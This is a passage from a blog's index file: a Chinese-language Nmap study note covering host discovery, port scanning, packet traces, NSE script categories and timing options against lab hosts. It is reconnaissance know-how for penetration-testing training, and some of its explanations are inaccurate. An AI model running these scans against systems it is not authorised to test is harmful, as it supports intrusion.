src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111730018.png" alt="image-20230711173037437"></p><p>ok</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/2023/07/08/nmap/"/>
      <url>/2023/07/08/nmap/</url>
      
        <content type="html"><![CDATA[<p>Nmap提供了许多不同类型的扫描，可用于获得有关我们目标的各种结果。基本上，Nmap可以分为以下扫描技术： 主机发现 端口扫描 服务枚举和检测 OS检测 与目标服务的脚本化交互（Nmap脚本引擎）</p><span id="more"></span><h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h2><pre><code class="shell-session">Tanin@htb[/htb]$ nmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;</code></pre><h2 id="Scan-Techniques"><a href="#Scan-Techniques" class="headerlink" title="Scan Techniques"></a>Scan Techniques</h2><p>Nmap提供了许多不同的扫描技术，可以进行不同类型的连接，并使用不同结构的数据包进行发送。在这里，我们可以看到Nmap提供的所有扫描技术：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nmap --help&lt;SNIP&gt;SCAN TECHNIQUES:  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans  -sU: UDP Scan  -sN/sF/sX: TCP Null, FIN, and Xmas scans  --scanflags &lt;flags&gt;: Customize TCP scan flags  -sI &lt;zombie host[:probeport]&gt;: Idle scan  -sY/sZ: SCTP INIT/COOKIE-ECHO scans  -sO: IP protocol scan  -b &lt;FTP relay host&gt;: FTP bounce scan&lt;SNIP&gt;</code></pre><p>例如，TCP-SYN扫描（-sS）是默认设置之一，除非我们另有定义，它也是最流行的扫描方法之一。这种扫描方法可以每秒扫描数千个端口。TCP-SYN扫描发送一个带有SYN标志的数据包，因此永远不会完成三方握手，这导致无法建立到扫描端口的完整TCP连接。</p><p>如果我们的目标将带有SYN-ACK标记的数据包发送回扫描的端口，Nmap会检测到该端口处于打开状态。 如果数据包接收到RST标志，则表示端口已关闭。 如果Nmap没有收到返回的数据包，它将显示为已过滤。根据防火墙配置，某些数据包可能会被防火墙丢弃或忽略。</p><h1 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h1><h4 id="Scan-Network-Range"><a href="#Scan-Network-Range" class="headerlink" title="Scan Network Range"></a>Scan Network Range</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d&quot; &quot; -f510.129.2.410.129.2.1010.129.2.1110.129.2.1810.129.2.1910.129.2.2010.129.2.28</code></pre><blockquote><p>提供的命令使用了<code>nmap</code>工具对IP范围10.129.2.0&#x2F;24执行了一个ping扫描（<code>-sn</code>）。然后，它以指定的格式（<code>-oA tnet</code>）保存输出结果。<code>grep for</code>命令用于过滤只显示包含关键词”for”的行。最后，<code>cut -d&quot; &quot; -f5</code>使用空格作为分隔符提取每行的第五个字段。</p><p>在这种情况下，第五个字段对应于响应了ping扫描的IP地址。</p></blockquote><h2 id="Scan-IP-List"><a href="#Scan-IP-List" class="headerlink" title="Scan IP List"></a>Scan IP List</h2><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d&quot; &quot; -f5</code></pre><table><thead><tr><th><code>-iL</code></th><th>Performs defined scans against targets in provided ‘hosts.lst’ list.</th></tr></thead><tbody><tr><td><code>-sn</code></td><td>Disables port scanning.</td></tr></tbody></table><h2 id="Scan-Multiple-IPs"><a href="#Scan-Multiple-IPs" class="headerlink" title="Scan Multiple IPs"></a>Scan Multiple IPs</h2><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d&quot; &quot; -f5</code></pre><p>如果这些IP地址相邻，我们也可以定义各自八位字节中的范围。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d&quot; &quot; -f5</code></pre><p>如果我们禁用端口扫描（-sn），Nmap会使用ICMP回显请求（-PE）自动ping扫描。一旦发送了这样的请求，如果ping主机处于活动状态，我们通常会收到ICMP回复。更有趣的事实是，我们之前的扫描并没有做到这一点，因为在Nmap发送ICMP回显请求之前，它会发送ARP ping，从而得到ARP回复。我们可以通过“–packet trace”选项来确认这一点。为了确保发送ICMP回显请求，我们还为此定义了选项（-PE）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up (0.023s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.05 seconds</code></pre><table><thead><tr><th><code>-PE</code></th><th>Performs the ping scan by using ‘ICMP Echo requests’ against the target.</th></tr></thead><tbody><tr><td><code>--packet-trace</code></td><td>Shows all packets sent and received</td></tr></tbody></table><p>另一种确定Nmap为什么将我们的目标标记为“alive”的方法是使用“–reason”选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CESTSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EFNmap scan report for 10.129.2.18Host is up, received arp-response (0.028s latency).MAC Address: DE:AD:00:00:BE:EFNmap done: 1 IP address (1 host up) scanned in 0.03 seconds</code></pre><p>我们在这里看到，Nmap确实通过ARP请求和ARP回复单独检测主机是否活着。要禁用ARP请求并用所需的ICMP回显请求扫描我们的目标，我们可以通过设置“–disable ARP ping”选项来禁用ARP ping。然后我们可以再次扫描目标，查看发送和接收的数据包。</p><p>ICMP回显请求可以帮助我们确定目标是否活着并识别其系统。有关主机发现的更多策略，请访问：<a href="https://nmap.org/book/host-discovery-strategies.html">https://nmap.org/book/host-discovery-strategies.html</a></p><blockquote><p>​不同操作系统的ICMP Time-to-Live (TTL)值可能会有所不同。TTL是一个IP数据包头部字段，它指定了数据包在网络中可以经过的最大路由跳数。当ICMP Echo Request（ping请求）被发送到目标主机时，TTL字段被设置为一个初始值，然后在每个路由器经过时递减。通过检查返回的ICMP Echo Reply（ping响应）中的TTL值，可以提供一些关于目标主机的操作系统类型的线索。</p><p>然而，需要注意的是，TTL值并非仅由操作系统决定，还受到网络设备、路由器和防火墙等因素的影响。因此，通过TTL值进行操作系统识别是一种推测，可能并不总是准确。</p><p>以下是一些常见操作系统的TTL默认值范例：</p><ul><li>Windows系统通常使用默认TTL值为 128。</li><li>Linux和Unix系统通常使用默认TTL值为 64。</li><li>macOS系统通常使用默认TTL值为 64。</li></ul></blockquote><h1 id="Host-and-Port-Scanning"><a href="#Host-and-Port-Scanning" class="headerlink" title="Host and Port Scanning"></a>Host and Port Scanning</h1><h2 id="Discovering-Open-TCP-Ports"><a href="#Discovering-Open-TCP-Ports" class="headerlink" title="Discovering Open TCP Ports"></a>Discovering Open TCP Ports</h2><p>默认情况下，Nmap使用SYN扫描（-sS）扫描前1000个TCP端口。由于创建原始TCP数据包所需的套接字权限，此SYN扫描仅在我们以root身份运行时设置为默认值。否则，默认情况下会执行TCP扫描（-sT）。这意味着，如果我们不定义端口和扫描方法，这些参数将自动设置。我们可以逐个定义端口（-p 22，25，80139445），按范围（-p 22-445），按Nmap数据库中已被签名为最频繁的顶级端口（-top ports&#x3D;10），通过扫描所有端口（-p-），也可以定义包含前100个端口（-F）的快速端口扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 --top-ports=10 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:36 CESTNmap scan report for 10.129.2.28Host is up (0.021s latency).PORT     STATE    SERVICE21/tcp   closed   ftp22/tcp   open     ssh23/tcp   closed   telnet25/tcp   open     smtp80/tcp   open     http110/tcp  open     pop3139/tcp  filtered netbios-ssn443/tcp  closed   https445/tcp  filtered microsoft-ds3389/tcp closed   ms-wbt-serverMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds</code></pre><p>我们看到，我们只扫描了目标的前10个TCP端口，Nmap相应地显示了它们的状态。如果我们跟踪Nmap发送的数据包，我们将看到目标发送回我们的TCP端口21上的RST标志。为了清楚地了解SYN扫描，我们禁用ICMP回显请求（-Pn）、DNS解析（-n）和ARP ping扫描（–disable ARP ping）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-pingStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:39 CESTSENT (0.0429s) TCP 10.10.14.2:63090 &gt; 10.129.2.28:21 S ttl=56 id=57322 iplen=44  seq=1699105818 win=1024 &lt;mss 1460&gt;RCVD (0.0573s) TCP 10.129.2.28:21 &gt; 10.10.14.2:63090 RA ttl=64 id=0 iplen=40  seq=0 win=0Nmap scan report for 10.11.1.28Host is up (0.014s latency).PORT   STATE  SERVICE21/tcp closed ftpMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds</code></pre><p>我们可以从SENT行中看到，我们（10.10.14.2）向我们的目标（10.129.2.28）发送了一个带有SYN标志（S）的TCP数据包。在下一行RCVD中，我们可以看到目标用一个包含RST和ACK标志（RA）的TCP包进行响应。RST和ACK标志用于确认TCP分组（ACK）的接收并结束TCP会话（RST）。</p><table><thead><tr><th><code>--packet-trace</code></th><th>Shows all packets sent and received.</th></tr></thead><tbody><tr><td><code>-n</code></td><td>Disables DNS resolution.</td></tr><tr><td><code>--disable-arp-ping</code></td><td>Disables ARP ping.</td></tr></tbody></table><h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><table><thead><tr><th><strong>Message</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>RCVD (0.0573s)</code></td><td>Indicates a received packet from the target.</td></tr><tr><td><code>TCP</code></td><td>Shows the protocol that is being used.</td></tr><tr><td><code>10.129.2.28:21 &gt;</code></td><td>Represents targets IPv4 address and the source port, which will be used to reply.</td></tr><tr><td><code>10.10.14.2:63090</code></td><td>Shows our IPv4 address and the port that will be replied to.</td></tr><tr><td><code>RA</code></td><td>RST and ACK flags of the sent TCP packet.</td></tr><tr><td><code>ttl=64 id=0 iplen=40 seq=0 win=0</code></td><td>Additional TCP Header parameters.</td></tr></tbody></table><h4 id="Connect-Scan"><a href="#Connect-Scan" class="headerlink" title="Connect Scan"></a>Connect Scan</h4><p>Nmap TCP连接扫描 <a href="https://nmap.org/book/scan-methods-connect-scan.html">TCP Connect Scan</a>（-sT）使用TCP三方握手来确定目标主机上的特定端口是打开还是关闭。扫描会向目标端口发送一个SYN数据包，并等待响应。如果目标端口用SYN-ACK数据包进行响应，则它被认为是打开的；如果目标端口使用RST数据包进行回应，则它是关闭的。 Connect扫描很有用，因为它是确定端口状态的最准确方法，也是最隐蔽的方法。与其他类型的扫描（如SYN扫描）不同，Connect扫描不会在目标主机上留下任何未完成的连接或未发送的数据包，这使得它不太可能被入侵检测系统（IDS）或入侵预防系统（IPS）检测到。当我们想绘制网络地图，又不想干扰其背后运行的服务时，它很有用，因此影响最小，有时被认为是一种更礼貌的扫描方法。 当目标主机具有丢弃传入数据包但允许传出数据包的个人防火墙时，它也很有用。在这种情况下，连接扫描可以绕过防火墙，准确地确定目标端口的状态。但是，需要注意的是，Connect扫描比其他类型的扫描慢，因为它要求扫描仪在发送每个数据包后等待来自目标的响应，如果目标繁忙或没有响应，这可能需要一些时间。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:26 CETCONN (0.0385s) TCP localhost &gt; 10.129.2.28:443 =&gt; Operation now in progressCONN (0.0396s) TCP localhost &gt; 10.129.2.28:443 =&gt; ConnectedNmap scan report for 10.129.2.28Host is up, received user-set (0.013s latency).PORT    STATE SERVICE REASON443/tcp open  https   syn-ackNmap done: 1 IP address (1 host up) scanned in 0.04 seconds</code></pre><h2 id="Filtered-Ports"><a href="#Filtered-Ports" class="headerlink" title="Filtered Ports"></a>Filtered Ports</h2><p>当一个端口显示为已过滤时，可能有几个原因。在大多数情况下，防火墙都设置了某些规则来处理特定的连接。数据包可以被丢弃，也可以被拒绝。当数据包被丢弃时，Nmap不会收到来自目标的响应，默认情况下，重试率（–max retries）设置为1。这意味着Nmap将向目标端口重新发送请求，以确定前一个数据包是否未被意外错误处理。 让我们看一个例子，其中防火墙丢弃了我们为端口扫描发送的TCP数据包。因此，我们扫描TCP端口139，该端口已显示为已过滤。为了能够跟踪我们发送的数据包是如何处理的，我们再次停用ICMP回显请求（-Pn）、DNS解析（-n）和ARP ping扫描（–disable ARP-ping）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:45 CESTSENT (0.0381s) TCP 10.10.14.2:60277 &gt; 10.129.2.28:139 S ttl=47 id=14523 iplen=44  seq=4175236769 win=1024 &lt;mss 1460&gt;SENT (1.0411s) TCP 10.10.14.2:60278 &gt; 10.129.2.28:139 S ttl=45 id=7372 iplen=44  seq=4175171232 win=1024 &lt;mss 1460&gt;Nmap scan report for 10.129.2.28Host is up.PORT    STATE    SERVICE139/tcp filtered netbios-ssnMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds</code></pre><p>我们在上一次扫描中看到，Nmap发送了两个带有SYN标志的TCP数据包。通过扫描的持续时间（2.06s），我们可以识别出它比以前的扫描花费了更长的时间（~0.05s）。如果防火墙拒绝数据包，情况就不同了。为此，我们看一下TCP端口445，它由防火墙的这种规则相应地处理。</p><p>​       </p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 445 --packet-trace -n --disable-arp-ping -PnStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:55 CESTSENT (0.0388s) TCP 10.129.2.28:52472 &gt; 10.129.2.28:445 S ttl=49 id=21763 iplen=44  seq=1418633433 win=1024 &lt;mss 1460&gt;RCVD (0.0487s) ICMP [10.129.2.28 &gt; 10.129.2.28 Port 445 unreachable (type=3/code=3) ] IP [ttl=64 id=20998 iplen=72 ]Nmap scan report for 10.129.2.28Host is up (0.0099s latency).PORT    STATE    SERVICE445/tcp filtered microsoft-dsMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds</code></pre><p>作为响应，我们收到一个ICMP回复，类型为3，错误代码为3，表示无法访问所需的主机。尽管如此，如果我们知道主机是活动的，我们可以强烈假设该端口上的防火墙正在拒绝数据包，稍后我们将不得不仔细查看该端口。</p><h2 id="Discovering-Open-UDP-Ports"><a href="#Discovering-Open-UDP-Ports" class="headerlink" title="Discovering Open UDP Ports"></a>Discovering Open UDP Ports</h2><p>有些系统管理员有时除了过滤TCP端口外，还忘记过滤UDP端口。由于UDP是一种无状态协议，不需要像TCP那样的三方握手。我们没有收到任何确认。因此，超时时间要长得多，使得整个UDP扫描（-sU）比TCP扫描（-sS）慢得多。 让我们来看看UDP扫描（-sU）的样子以及它给我们带来的结果。</p><h4 id="UDP-Port-Scan"><a href="#UDP-Port-Scan" class="headerlink" title="UDP Port Scan"></a>UDP Port Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -F -sUStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CESTNmap scan report for 10.129.2.28Host is up (0.059s latency).Not shown: 95 closed portsPORT     STATE         SERVICE68/udp   open|filtered dhcpc137/udp  open          netbios-ns138/udp  open|filtered netbios-dgm631/udp  open|filtered ipp5353/udp open          zeroconfMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 98.07 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>-sU</code></td><td>Performs a UDP scan.</td></tr></tbody></table><p>这样做的另一个缺点是，我们经常得不到响应，因为Nmap向扫描的UDP端口发送空数据报，而我们没有收到任何响应。因此，我们无法确定UDP数据包是否已经到达。如果UDP端口是打开的，我们只有在应用程序被配置为打开时才会得到响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:15 CESTSENT (0.0367s) UDP 10.10.14.2:55478 &gt; 10.129.2.28:137 ttl=57 id=9122 iplen=78RCVD (0.0398s) UDP 10.129.2.28:137 &gt; 10.10.14.2:55478 ttl=64 id=13222 iplen=257Nmap scan report for 10.129.2.28Host is up, received user-set (0.0031s latency).PORT    STATE SERVICE    REASON137/udp open  netbios-ns udp-response ttl 64MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</code></pre><p>如果我们得到错误代码为3（无法访问端口）的ICMP响应，我们就知道该端口确实已关闭。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:25 CESTSENT (0.0445s) UDP 10.10.14.2:63825 &gt; 10.129.2.28:100 ttl=57 id=29925 iplen=28RCVD (0.1498s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port unreachable (type=3/code=3) ] IP [ttl=64 id=11903 iplen=56 ]Nmap scan report for 10.129.2.28Host is up, received user-set (0.11s latency).PORT    STATE  SERVICE REASON100/udp closed unknown port-unreach ttl 64MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)Nmap done: 1 IP address (1 host up) scanned in  0.15 seconds</code></pre><p>另一种方便的扫描端口的方法是-sV选项，用于从打开的端口获取额外的可用信息。这种方法可以识别版本、服务名称和有关我们目标的详细信息。</p><p>More information about port scanning techniques we can find at: <a href="https://nmap.org/book/man-port-scanning-techniques.html">https://nmap.org/book/man-port-scanning-techniques.html</a></p><h1 id="Saving-the-Results"><a href="#Saving-the-Results" class="headerlink" title="Saving the Results"></a>Saving the Results</h1><h2 id="Different-Formats"><a href="#Different-Formats" class="headerlink" title="Different Formats"></a>Different Formats</h2><p>当我们运行各种扫描时，我们应该始终保存结果。我们可以稍后使用这些来检查我们使用的不同扫描方法之间的差异。Nmap可以将结果保存为3种不同的格式。 </p><p>具有.nmap文件扩展名的正常输出（-oN） </p><p>具有.gnmap文件扩展名的可扩展输出（-oG） </p><p>扩展名为.XML的XML输出（-oX）</p><h2 id="Style-sheets"><a href="#Style-sheets" class="headerlink" title="Style sheets"></a>Style sheets</h2><p>有了XML输出，我们可以轻松地创建易于阅读的HTML报告，即使对于非技术人员来说也是如此。这在以后的文档中非常有用，因为它以详细而清晰的方式呈现了我们的结果。要将存储的结果从XML格式转换为HTML，我们可以使用xsltproc工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ xsltproc target.xml -o target.html</code></pre><p>More information about the output formats can be found at: <a href="https://nmap.org/book/output.html">https://nmap.org/book/output.html</a></p><h1 id="Service-Enumeration"><a href="#Service-Enumeration" class="headerlink" title="Service Enumeration"></a>Service Enumeration</h1><p>首先，Nmap会查看扫描端口的横幅并将其打印出来。如果无法通过横幅识别版本，Nmap会尝试通过基于签名的匹配系统识别版本，但这会显著增加扫描的持续时间。Nmap给出的结果的一个缺点是，自动扫描可能会错过一些信息，因为有时Nmap不知道如何处理这些信息。</p><p>在成功的三方握手之后，服务器通常会发送一条横幅进行标识。这是为了让客户端知道它正在使用哪个服务。在网络级别，这种情况发生在TCP报头中的PSH标志上。然而，某些服务可能不会立即提供此类信息。还可以从相应的服务中移除或操纵横幅。如果我们使用nc手动连接到SMTP服务器，获取横幅，并使用tcpdump拦截网络流量，我们可以看到Nmap没有向我们显示的内容</p><h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</code></pre><h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><pre><code class="shell-session">Tanin@htb[/htb]$  nc -nv 10.129.2.28 25Connection to 10.129.2.28 port 25 [tcp/*] succeeded!220 inlane ESMTP Postfix (Ubuntu)</code></pre><h1 id="Nmap-Scripting-Engine"><a href="#Nmap-Scripting-Engine" class="headerlink" title="Nmap Scripting Engine"></a>Nmap Scripting Engine</h1><p>Nmap脚本引擎（NSE）是Nmap的另一个方便功能。它为我们提供了在Lua中创建用于与某些服务交互的脚本的可能性。这些脚本总共可分为14类：</p><table><thead><tr><th><strong>类别</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>auth</code></td><td>确定身份验证凭据。</td></tr><tr><td><code>broadcast</code></td><td>通过广播和发现的主机用于主机发现的脚本可以自动添加到其余扫描中。</td></tr><tr><td><code>brute</code></td><td>执行尝试通过使用凭据暴力破解登录到相应服务的脚本。</td></tr><tr><td><code>default</code></td><td>使用该选项执行的默认脚本。<code>-sC</code></td></tr><tr><td><code>discovery</code></td><td>无障碍服务评估。</td></tr><tr><td><code>dos</code></td><td>这些脚本用于检查服务是否存在拒绝服务漏洞，并且使用较少，因为它会损害服务。</td></tr><tr><td><code>exploit</code></td><td>此类脚本尝试利用扫描端口的已知漏洞。</td></tr><tr><td><code>external</code></td><td>使用外部服务进行进一步处理的脚本。</td></tr><tr><td><code>fuzzer</code></td><td>这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。</td></tr><tr><td><code>intrusive</code></td><td>可能对目标系统产生负面影响的侵入性脚本。</td></tr><tr><td><code>malware</code></td><td>检查某些恶意软件是否感染了目标系统。</td></tr><tr><td><code>safe</code></td><td>不执行侵入性和破坏性访问的防御性脚本。</td></tr><tr><td><code>version</code></td><td>服务检测的扩展。</td></tr><tr><td><code>vuln</code></td><td>识别特定漏洞。</td></tr></tbody></table><h4 id="Default-Scripts"><a href="#Default-Scripts" class="headerlink" title="Default Scripts"></a>Default Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; -sC</code></pre><h4 id="Specific-Scripts-Category"><a href="#Specific-Scripts-Category" class="headerlink" title="Specific Scripts Category"></a>Specific Scripts Category</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;category&gt;</code></pre><h4 id="Defined-Scripts"><a href="#Defined-Scripts" class="headerlink" title="Defined Scripts"></a>Defined Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...</code></pre><p>例如，让我们继续使用目标SMTP端口，并查看使用两个定义的脚本得到的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commandsStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 23:21 CESTNmap scan report for 10.129.2.28Host is up (0.050s latency).PORT   STATE SERVICE25/tcp open  smtp|_banner: 220 inlane ESMTP Postfix (Ubuntu)|_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)</code></pre><table><thead><tr><th><code>-A</code></th><th>Performs service detection, OS detection, traceroute and uses defaults scripts to scan the target.</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h1 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h1><p>当我们需要扫描广泛的网络或处理低网络带宽时，扫描性能起着重要作用。我们可以使用各种选项来告诉Nmap测试数据包的速度（-T＜1-5&gt;）、频率（–min parallelism＜number＞）、超时（–max rtt timeout＜time＞）、同时发送的数据包数量（–min rate＜number＞)。</p><h2 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h2><p>当Nmap发送数据包时，从扫描端口接收响应需要一些时间（往返时间-RTT）。通常，Nmap以100ms的高超时（–min RTT超时）开始。让我们看一个例子，通过扫描具有256个主机的整个网络，包括前100个端口。</p><h4 id="Default-Scan"><a href="#Default-Scan" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds</code></pre><h4 id="Optimized-RTT"><a href="#Optimized-RTT" class="headerlink" title="Optimized RTT"></a>Optimized RTT</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms&lt;SNIP&gt;Nmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds</code></pre><table><thead><tr><th><strong>Scanning Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-F</code></td><td>Scans top 100 ports.</td></tr><tr><td><code>--initial-rtt-timeout 50ms</code></td><td>Sets the specified time value as initial RTT timeout.</td></tr><tr><td><code>--max-rtt-timeout 100ms</code></td><td>Sets the specified time value as maximum RTT timeout.</td></tr></tbody></table><p>当比较两次扫描时，我们可以看到，我们发现优化扫描减少了两台主机，但扫描只花了四分之一的时间。由此，我们可以得出结论，将初始RTT超时（–initial RTT timeout）设置为太短的时间段可能会导致我们忽略主机。</p><h2 id="Max-Retries"><a href="#Max-Retries" class="headerlink" title="Max Retries"></a>Max Retries</h2><p>另一种提高扫描速度的方法是指定发送数据包的重试率（–max retries）。重试率的默认值是10，因此，如果Nmap没有收到端口的响应，它将不会向该端口发送更多的数据包，并且将被跳过。</p><h4 id="Default-Scan-1"><a href="#Default-Scan-1" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F | grep &quot;/tcp&quot; | wc -l23</code></pre><h4 id="Reduced-Retries"><a href="#Reduced-Retries" class="headerlink" title="Reduced Retries"></a>Reduced Retries</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep &quot;/tcp&quot; | wc -l21</code></pre><p>我们再次认识到，加速也会对我们的结果产生负面影响，这意味着我们可能忽视重要信息。</p><h2 id="Rates"><a href="#Rates" class="headerlink" title="Rates"></a>Rates</h2><p>在白盒渗透测试期间，我们可能会将安全系统列入白名单，以检查网络中的系统是否存在漏洞，而不仅仅是测试保护措施。如果我们知道网络带宽，我们就可以处理发送的数据包的速率，这大大加快了我们使用Nmap的扫描速度。当设置发送数据包的最小速率（–min-rate＜number＞）时，我们告诉Nmap同时发送指定数量的数据包。它将尝试相应地保持利率。</p><h4 id="Default-Scan-2"><a href="#Default-Scan-2" class="headerlink" title="Default Scan"></a>Default Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds</code></pre><h4 id="Optimized-Scan"><a href="#Optimized-Scan" class="headerlink" title="Optimized Scan"></a>Optimized Scan</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300&lt;SNIP&gt;Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds</code></pre><table><thead><tr><th><code>--min-rate 300</code></th><th>Sets the minimum number of packets to be sent per second.</th></tr></thead></table><h2 id="Timing"><a href="#Timing" class="headerlink" title="Timing"></a>Timing</h2><p>因为这样的设置不能总是手动优化，比如在黑匣子渗透测试中，Nmap提供了六种不同的计时模板（-T＜0-5＞）供我们使用。这些值（0-5）决定了我们扫描的攻击性。如果扫描过于激进，这也会产生负面影响，安全系统可能会因产生的网络流量而阻止我们。当我们没有定义其他内容时，使用的默认计时模板是正常的（-T3）。</p><ul><li><code>-T 0</code> &#x2F; <code>-T paranoid</code></li><li><code>-T 1</code> &#x2F; <code>-T sneaky</code></li><li><code>-T 2</code> &#x2F; <code>-T polite</code></li><li><code>-T 3</code> &#x2F; <code>-T normal</code></li><li><code>-T 4</code> &#x2F; <code>-T aggressive</code></li><li><code>-T 5</code> &#x2F; <code>-T insane</code></li></ul><p>这些模板包含我们也可以手动设置的选项，我们已经看到了其中的一些。开发人员根据他们的最佳结果确定了这些模板的值集，使我们更容易将扫描适应相应的网络环境。我们可以在这里找到确切使用的选项及其值：</p><p><a href="https://nmap.org/book/performance-timing-templates.html">https://nmap.org/book/performance-timing-templates.html</a></p><h1 id="Firewall-and-IDS-x2F-IPS-Evasion"><a href="#Firewall-and-IDS-x2F-IPS-Evasion" class="headerlink" title="Firewall and IDS&#x2F;IPS Evasion"></a>Firewall and 